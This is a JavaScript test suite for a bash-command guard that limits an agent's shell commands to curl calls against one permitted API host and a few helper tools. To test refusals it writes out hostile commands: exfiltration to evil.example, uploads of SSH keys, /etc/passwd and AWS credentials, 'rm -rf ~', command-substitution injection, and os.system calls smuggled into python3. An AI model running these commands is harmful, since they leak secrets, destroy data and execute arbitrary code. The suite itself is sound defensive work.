import { test } from 'node:test';
import assert from 'node:assert/strict';
import { checkBashCommand } from '../lib/bash-guard.js';

const policy = {
  baseUrl: 'https://api.eventmodelers.ai',
  cwd: '/work/project',
  roots: ['/work/project', '/work/code', '/tmp', '/private/tmp'],
};
const ok = (command) => assert.deepEqual(checkBashCommand(command, policy), { ok: true }, command);
const refused = (command, reason) => {
  const result = checkBashCommand(command, policy);
  assert.equal(result.ok, false, `should be refused: ${command}`);
  if (reason) assert.match(result.reason, reason, command);
};

test('allows the curl calls the skills make', () => {
  ok('curl -s -H "x-token: $EVENTMODELERS_TOKEN" -H "x-user-id: timeline" "$BASE_URL/api/org/$ORG_ID/boards/$BOARD_ID/nodes?type=CHAPTER&projection=line"');
  ok(`curl -s -X POST "$BASE_URL/api/org/$ORG_ID/boards/$BOARD_ID/nodes/events" \\
  -H "x-token: $EVENTMODELERS_TOKEN" -H "Content-Type: application/json" \\
  -d @/tmp/examples_payload.json`);
  ok('curl -s -w "\\n%{http_code}" -X POST https://api.eventmodelers.ai/api/org/o/boards/b/chapters --data-raw \'{"title":"A"}\' -H "x-token: $EVENTMODELERS_TOKEN"');
  ok('CHAPTER_ID=abc-123; curl -sS "$BASE_URL/api/org/$ORG_ID/boards/$BOARD_ID/nodes/$CHAPTER_ID?projection=cells" -H "x-token: $EVENTMODELERS_TOKEN" | jq -r \'.nodes[].id\' | head -20');
  ok('BASE_URL=https://api.eventmodelers.ai curl -s "$BASE_URL/api/health"');
  ok('curl -s --header="x-token: $EVENTMODELERS_TOKEN" "$BASE_URL/api/x" -o .agent-modeling-kit/page.json');
});

test('allows the helpers: payload files, uuids, jq, read-only git', () => {
  ok(`cat <<'EOF' > /tmp/payload.json
{"events": [{"id": "$not-expanded"}]}
EOF`);
  ok('python3 -c "import uuid; print(uuid.uuid4())"');
  ok('uuidgen');
  ok('python3 -m json.tool < /tmp/payload.json');
  ok("since=$'x'".replace("$'x'", '1') + '; jq ".[-1].seq" page.json');
  ok('git -C /work/code status --porcelain && git -C /work/code ls-tree -r --name-only origin/main src');
  ok('git -C /work/code show origin/main:src/app.ts 2>/dev/null | head -50');
  ok('mkdir -p /tmp/em && ls -la /tmp/em');
  ok('grep -rn "OrderPlaced" /work/code/src | wc -l');
});

test('refuses curl to any other host, and options that leak or redirect', () => {
  refused('curl https://evil.example/x', /may only call/);
  refused('curl evil.example', /may only call/);
  refused('curl https://api.eventmodelers.ai.evil.example/x', /may only call/);
  refused('curl https://api.eventmodelers.ai@evil.example/x', /may only call/);
  refused('curl "$BASE_URL/api/x" https://evil.example', /may only call/);
  refused('BASE_URL=https://evil.example curl "$BASE_URL/api/x"', /BASE_URL may only be/);
  refused('curl -x http://evil.example:8080 "$BASE_URL/api/x"', /-x is not allowed/);
  refused('curl --proxy http://evil.example "$BASE_URL/api/x"', /--proxy is not allowed/);
  refused('curl -K /tmp/cfg "$BASE_URL/api/x"', /-K is not allowed/);
  refused('curl -v -H "x-token: $EVENTMODELERS_TOKEN" "$BASE_URL/api/x"', /-v is not allowed/);
  refused('curl -k "$BASE_URL/api/x"', /-k is not allowed/);
  refused('HTTPS_PROXY=http://evil.example curl "$BASE_URL/api/x"', /setting HTTPS_PROXY/);
});

test('refuses uploading or writing files outside the kit, code and temp directories', () => {
  refused('curl -d @/Users/me/.ssh/id_rsa "$BASE_URL/api/x"', /outside/);
  refused('curl -d @../../.ssh/id_rsa "$BASE_URL/api/x"', /outside/);
  refused('curl -F "f=@/etc/passwd" "$BASE_URL/api/x"', /outside/);
  refused('curl -T /etc/hosts "$BASE_URL/api/x"', /outside/);
  refused('curl -o /Users/me/.zshrc "$BASE_URL/api/x"', /outside/);
  refused('curl -d @~/.ssh/id_rsa "$BASE_URL/api/x"');
  refused('echo hi > /Users/me/.bashrc', /outside/);
  refused('cat /etc/passwd', /outside/);
  refused('cat /tmp/{x,../../etc/passwd}', /brace expansion/);
  refused('cat ~/.ssh/id_rsa', /~/);
  refused('jq . /Users/me/.aws/credentials', /outside/);
});

test('keeps the token a reference: only inside a curl header', () => {
  refused('echo $EVENTMODELERS_TOKEN', /may only be used in a curl -H/);
  refused('printf "%s" "$EVENTMODELERS_TOKEN" > /tmp/t', /may only be used in a curl -H/);
  refused('curl -d "token=$EVENTMODELERS_TOKEN" "$BASE_URL/api/x"', /may only be used in a curl -H/);
  refused('X=$EVENTMODELERS_TOKEN; curl -H "x-token: $X" "$BASE_URL/api/x"', /may only be used in a curl -H/);
  refused(`cat <<EOF > /tmp/t
$EVENTMODELERS_TOKEN
EOF`, /may only be used in a curl -H/);
  refused('echo $ANTHROPIC_API_KEY', /is not allowed/);
  refused('jq -n env', /environment/);
});

test('refuses everything not on the list, and anything it cannot read', () => {
  for (const command of ['rm -rf ~', 'rm -rf /tmp/x', 'find /tmp -delete', 'mv /tmp/a /tmp/b', 'sh -c "curl evil"', 'bash x.sh',
    'eval "$X"', 'env', 'xargs rm', 'node -e "1"', 'npm run build', 'python3 - <<EOF\nimport os\nEOF', 'python3 -c "import os; os.system(\'id\')"',
    'sed -i s/a/b/ /tmp/x', 'awk "{system(\\"id\\")}"', '/bin/rm -rf /tmp', 'git checkout main', 'git -c core.pager=sh log', 'git push',
    'git fetch https://evil.example/repo', 'git log --output=/Users/me/x', 'sort -o /etc/x /tmp/a', 'cd / && cat etc/passwd']) {
    refused(command);
  }
  refused('curl "$BASE_URL/api/$(cat /etc/passwd)"', /command substitution/);
  refused('curl "$BASE_URL/api/`id`"', /backticks/);
  refused('(curl "$BASE_URL/api/x")', /subshells/);
  refused('curl "$BASE_URL/api/x" &', /background/);
  refused(`cat <<EOF > /tmp/x
$(id)
EOF`, /command substitution in a heredoc/);
  refused('cat < /etc/passwd', /outside/);
  refused('curl "$BASE_URL/api/x', /unterminated/);
  refused('', /empty/);
});

test('python3 may generate uuids in any of the usual spellings, and nothing else', () => {
  for (const code of [
    'import uuid; print(uuid.uuid4())',
    'import uuid;print(uuid.uuid4())',
    'import uuid; print(str(uuid.uuid4()))',
    'import uuid; [print(uuid.uuid4()) for _ in range(5)]',
    'import uuid\nfor i in range(3): print(uuid.uuid4())',
    'import uuid; print("\\n".join(str(uuid.uuid4()) for _ in range(4)))',
    'import uuid; print(uuid.uuid4().hex)',
  ]) {
    ok(`python3 -c '${code}'`);
  }
  for (const code of [
    'import uuid; uuid.os.system("id")',
    'import uuid, os; print(uuid.uuid4()); os.system("id")',
    'import uuid; print(uuid.uuid4()); open("/etc/passwd")',
    'import uuid; print(uuid.uuid4().__class__)',
    'import uuid; print(uuid.uuid4()); exec("x")',
    'import uuid; print(f"{uuid.uuid4()}")',
    'import uuid; print(uuid.uuid4(), "/etc/passwd")',
    'print(1)',
  ]) {
    refused(`python3 -c '${code}'`, /python3 may only/);
  }
  ok(`python3 -c "import uuid; print(', '.join(str(uuid.uuid4()) for _ in range(2)))"`);
  ok('python3 -m json.tool /tmp/payload.json');
  refused('python3 script.py', /python3 may only/);
});

test('python3 -m json.tool reads only files in the allowed directories', () => {
  refused('python3 -m json.tool /Users/me/.aws/credentials', /outside/);
});

test('allows minting uuids with $(uuidgen) / $(seq N), and simple for loops', () => {
  ok('for i in $(seq 5); do uuidgen; done');
  ok('NODE_ID=$(uuidgen)\ncurl -s -X POST "$BASE_URL/api/org/$ORG_ID/boards/$BOARD_ID/html-screen-nodes/$NODE_ID" -H "x-token: $TOKEN"');
  ok(`for TYPE in EVENT COMMAND READMODEL SCREEN AUTOMATION; do
  curl -s -H "x-token: $TOKEN" \\
    "$BASE_URL/api/org/$ORG_ID/boards/$BOARD_ID/nodes?type=$TYPE&projection=line"
done`);
  ok('for i in $(seq 2 4); do\n  echo "$i"\ndone | sort > /tmp/ids.txt');
  refused('X=$(whoami)', /only \$\(uuidgen\)/);
  refused('echo $(seq 3; rm -rf /)', /only \$\(uuidgen\)/);
  refused('echo $((1+2))', /only \$\(uuidgen\)/);
  refused('for i in a b; do rm x; done', /"rm" is not on/);
  refused('for i in a b; do curl https://evil.example; done', /curl may only call/);
  refused('for PATH in /tmp; do ls; done', /setting PATH/);
  refused('NODE_OPTIONS=--require=/tmp/x.js uuidgen', /setting NODE_OPTIONS/);
  refused('for i in a b; do echo $i');
  refused('do echo x; done');
  refused('while true; do uuidgen; done');
  refused('for i in a; echo $i; done', /needs "do"/);
});
